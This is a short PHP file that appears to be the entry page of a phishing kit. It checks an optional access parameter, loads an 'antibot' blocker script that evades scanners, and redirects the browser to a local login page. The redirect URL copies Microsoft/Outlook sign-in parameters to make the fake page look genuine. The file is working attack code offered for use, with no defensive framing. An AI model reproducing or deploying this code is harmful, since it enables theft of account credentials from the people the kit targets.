<?php
session_start();
require_once('config/config.php');
if($config['setpar'] == "on") {
  $a = $config['par'];
  if (!isset($_GET[$a])) {
       
    }else{
      $b = $_GET[$a];
    }
}
if ($config['antibot'] == "on"){
require_once 'config/blocker.php';
}
echo "<script type='text/javascript'>window.top.location='login?wa=wsignin1.0&ct=1594319001&rver=6.6.6556.0&wp=MBI_SSL&wreply=https:%2F%2Foutlook.live.com&id=$key'</script>";
?>
